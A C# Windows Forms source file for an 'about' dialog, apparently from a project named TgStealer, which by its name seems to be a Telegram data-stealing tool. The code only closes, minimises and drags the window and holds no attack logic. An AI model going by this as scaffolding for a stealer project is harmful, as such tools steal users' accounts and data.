using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace TgStealer
{
    public partial class about : Form
    {
        public about()
        {
            InitializeComponent();
        }

        private void closedLabel_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void label1_Click(object sender, EventArgs e)
        {
            WindowState = FormWindowState.Minimized;
        }

        private void about_KeyDown(object sender, KeyEventArgs e)
        {
            //
        }

        private void label1_MouseDown(object sender, MouseEventArgs e)
        {
            // 
        }

        private void about_MouseDown(object sender, MouseEventArgs e)
        {
            this.Capture = false;
            var msg = Message.Create(this.Handle, 0xa1, new IntPtr(2), IntPtr.Zero);
            this.WndProc(ref msg);
        }
    }
}
